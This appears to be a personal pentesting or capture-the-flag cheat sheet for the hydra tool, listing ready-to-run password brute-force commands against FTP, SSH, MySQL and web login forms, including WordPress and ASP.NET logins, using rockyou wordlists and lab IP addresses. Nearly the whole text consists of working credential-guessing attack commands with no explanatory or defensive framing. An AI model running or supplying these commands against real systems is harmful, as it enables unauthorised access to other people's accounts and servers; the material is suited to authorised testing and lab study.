# hydra

## FTP

```bash
hydra -l user -P passlist.txt ftp://192.168.0.1
```

## SSH

```bash
# Using a specific username and specific password
hydra -l <username> -p <password> <ip> -t 4 ssh
# Using a username list and password list
hydra -L <full path to users list file> -P <full path to pass list file> <ip> -t 4 ssh
# Using a specific username and a password list
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.81.254 -t 4 ssh
```

## MySQL

```bash
hydra -L usernames.txt -P xxxxx.txt <ip> mysql
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
```

## HTTP

```bash
hydra -l <username> -P <password list> <ip> http-post-form "/<login url>/:username=^USER^&password=^PASS^:F=incorrect" -V
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.177.14 http-post-form "/login/:username=^USER^&password=^PASS^&Login=Login:Your username or password is incorrect."
```

```html
# Check input types and names
<input type="text" name="log" id="user_login" class="input" value="" size="20" /></label>
<input type="password" name="pwd" id="user_pass" class="input" value="" size="20" /></label>
<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
<input type="hidden" name="testcookie" value="1" />
```

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.248.119 http-post-form "/wp-login.php/:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Locationtestcookie=1:S=Location"
```

```bash
# Use hydra for logging into web browser form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.14.194 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=VvRo%2F6BZHb2Awbdr5eTk9Nlfu1WCSJuXgkpjYDfz63IMQ385Fd2L%2B82aF5Xb82NRNIvOve45O2b7nBn%2FL1Ga0QPlfFBJbbXt3yQsgJ78NksKmm4sjAfbr3Ef38YZ%2B5bEsNkLwbBXS1WJxMHBkz0L%2FWNql9b8eY%2FBSLtcycQkzdVeMVlh&__EVENTVALIDATION=en7XtOPeeBOeVZk5EjflY%2BAF7C4gP00Y2M04gWkErBnss1kSFkrj0m3AdFupCkAxs3Kg4rqcp1zVWcmnSAaDkVRmNu348TWPiL62AvF5pW9olyAnkpmZq%2F8Pqt6PYY%2FX16MX6m01JrswnT3%2FAb8y2GyeZif3VzuaULbMRJ%2FEJ%2FP5xrkz&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```
